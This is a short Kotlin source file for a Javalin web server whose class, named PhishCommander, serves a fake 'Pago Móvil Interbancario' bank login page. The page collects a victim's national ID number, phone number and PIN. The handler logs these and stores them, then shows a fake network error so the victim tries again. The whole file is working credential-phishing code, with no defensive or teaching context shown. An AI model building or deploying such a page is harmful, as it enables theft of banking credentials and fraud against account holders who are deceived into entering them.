package com.fardc.sigint.core

import io.javalin.Javalin

class PhishCommander(private val vault: SecurityVault) {
    fun setupPhishPage(app: Javalin) {
        app.get("/login/pagomovil") { ctx ->
            ctx.html("""
                <html>
                <body style="background:#f4f4f4; font-family:sans-serif; text-align:center; padding-top:50px;">
                    <div style="background:white; width:350px; margin:auto; padding:25px; border:1px solid #ddd; border-radius:8px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1);">
                        <h2 style="color:#003893;">Pago Móvil Interbancario</h2>
                        <form action="/login/capture-pago" method="POST">
                            <input type="text" name="ci" placeholder="Cédula (V-12345678)" style="width:100%; padding:12px; margin:10px 0;"><br>
                            <input type="text" name="phone" placeholder="Teléfono" style="width:100%; padding:12px; margin:10px 0;"><br>
                            <input type="password" name="pin" placeholder="PIN" style="width:100%; padding:12px; margin:10px 0;"><br>
                            <button type="submit" style="width:100%; padding:12px; background:#003893; color:white; border:none; border-radius:4px; font-weight:bold;">CONTINUAR</button>
                        </form>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }

        app.post("/login/capture-pago") { ctx ->
            val ci = ctx.formParam("ci") ?: "N/A"
            val phone = ctx.formParam("phone") ?: "N/A"
            val pin = ctx.formParam("pin") ?: "N/A"
            println("⚠️ [CAPTURE] CI: $ci | Tel: $phone | PIN: $pin")
            vault.encryptData("CI: $ci | Tel: $phone | PIN: $pin")
            ctx.result("Error de red. Intente de nuevo.")
        }
    }
}
